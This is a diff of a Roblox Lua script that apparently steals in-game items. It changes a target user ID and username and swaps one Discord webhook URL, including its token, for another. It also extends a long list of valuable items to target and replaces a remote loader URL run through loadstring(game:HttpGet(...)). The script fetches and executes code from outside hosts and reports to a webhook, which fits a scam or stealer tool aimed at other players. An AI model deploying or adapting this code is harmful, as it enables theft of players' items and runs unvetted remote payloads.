@@ -1,54 +1,49 @@
-local TARGET_ID = 9078978146
-local TARGET_USER = "Julia6482949"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1573748712155644005/iKhhdtBR8OxpcScL68Tmdnm2wKnVB7ScM-PkXqXqt1C-en84Wlv0RpOpEDpApX1hmjse"
+local TARGET_ID = 7118901837
+local TARGET_USER = "MrNicomanu2"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1561775175379325083/WKq9fBGOGlETPqolbl_CagMzUv87dWRou0NO27HWPhLwiWi63lZhtA1OpdBHmeDjk7AG"
 
 local TargetBrainrots = {
-    ["Hydra Bunny"] = true,
-    ["Hydra Dragon Cannelloni"] = true,
-    ["Dragon Cannelloni"] = true,
-    ["Griffin"] = true,
-    ["Dragon Gingerini"] = true,
-    ["Elefanto Frigo"] = true,
-    ["Rico Dinero"] = true,
-    ["Rubrikiko"] = true,
-    ["Arcadragon"] = true,
-    ["Pancake and Syrup"] = true,
-    ["Kalika Bros"] = true,
-    ["Tirilikalika Tirilikalako"] = true,
-    ["Globa Steppa"] = true,
-    ["Dug Dug Dug"] = true,
-    ["La Supreme Combinasion"] = true,
-    ["La Casa Boo"] = true,
-    ["Dragon Aquanini"] = true,
-    ["Signore Carapace"] = true,
-    ["Fishino Clownino"] = true,
-    ["Cerberus"] = true,
-    ["Duggy Bros"] = true,
-    ["Kraken"] = true,
-    ["Venuspino"] = true,
-    ["Gorillo Subwoofero"] = true,
-    ["Foxini Lanternini"] = true,
-    ["La Secret Combinasion"] = true,
-    ["Garama and Madundung"] = true,
     ["Dragon Skeletonini"] = true,
-    ["Hydra Serpent"] = true,
-    ["Strawberry Elephant"] = true,
-    ["Plant Bros"] = true,
-    ["Orchidox"] = true,
     ["Phoenix"] = true,
-    ["Examen Bros"] = true,
+    ["Plant Bros"] = true,
+    ["Hydra Serpent"] = true,
+    ["Orchidox"] = true,
+    ["Strawberry Elephant"] = true,
     ["Meowl"] = true,
     ["Skibidi Toilet"] = true,
     ["Los Dragons"] = true,
     ["La Craft Machine"] = true,
     ["Gold and Diamond"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Griffin"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Hydra Bunny"] = true,
     ["Antonio"] = true,
     ["John Pork"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Rubrikiko"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Arcadragon"] = true,
+    ["Rico Dinero"] = true,
     ["Capitano Americano"] = true,
+    ["Kalika Bros"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Globa Steppa"] = true,
+    ["Dug Dug Dug"] = true,
+    ["Dragon Aquanini"] = true,
+    ["La Casa Boo"] = true,
+    ["La Supreme Combinasion"] = true,
     ["Headless Horseman"] = true,
+    ["Signore Carapace"] = true,
+    ["Fishino Clownino"] = true,
     ["4th Bros"] = true,
     ["Bufalino Boomberino"] = true,
+    ["Duggy Bros"] = true,
+    ["Cerberus"] = true,
+    ["Kraken"] = true,
     ["Money Money Bros"] = true,
+    ["Venuspino"] = true,
     ["Steakini Fattini"] = true,
     ["Rhino Helicopterino"] = true,
     ["Caylusaurus"] = true,
@@ -56,7 +51,9 @@ local TargetBrainrots = {
     ["Centrucci Nuclucci"] = true,
     ["Los Hackers"] = true,
     ["John Doe"] = true,
+    ["Gorillo Subwoofero"] = true,
     ["Jelly Moby"] = true,
+    ["Foxini Lanternini"] = true,
     ["Ginger Cisterna"] = true,
     ["Bearito Cabinito"] = true,
     ["Digi Narwhal"] = true,
@@ -121,6 +118,7 @@ local TargetBrainrots = {
     ["Fragrama and Chocrama"] = true,
     ["Frankentteo"] = true,
     ["GOAT"] = true,
+    ["Garama and Madundung"] = true,
     ["Giftini Spyderini"] = true,
     ["Ginger Gerat"] = true,
     ["Gobblino Uniciclino"] = true,
@@ -151,6 +149,7 @@ local TargetBrainrots = {
     ["La Lucky Grande"] = true,
     ["La Romantic Grande"] = true,
     ["La Sahur Combinasion"] = true,
+    ["La Secret Combinasion"] = true,
     ["La Spooky Grande"] = true,
     ["La Taco Combinasion"] = true,
     ["La Vacca Jacko Linterino"] = true,
@@ -163,6 +162,7 @@ local TargetBrainrots = {
     ["Lavadorito Spinito"] = true,
     ["Coco and Mango"] = true,
     ["Los Secret Combinasionas"] = true,
+    ["Examen Bros"] = true,
     ["Pizza and Ranch"] = true,
     ["Chicleteira Champeona"] = true,
     ["List List List Sahur"] = true,
@@ -350,7 +350,8 @@ local TargetGears = {
     ["Yin Yang Lamp"] = true,
     ["Yin Yang Slap"] = true,
     ["Phantom Slap"] = true,
-    ["Crystal Slap"] = true
+    ["Crystal Slap"] = true,
+    ["Skeleton Dragon"] = true
 }
 
 task.spawn(function()
@@ -358,7 +359,7 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/xx5A24iP/raw"))()
+    loadstring(game:HttpGet("https://flowauth.net/v1/loaders/a1e6a0c3d1ac34907b1e287dec840f07.lua"))()
 
     task.wait(1)
 
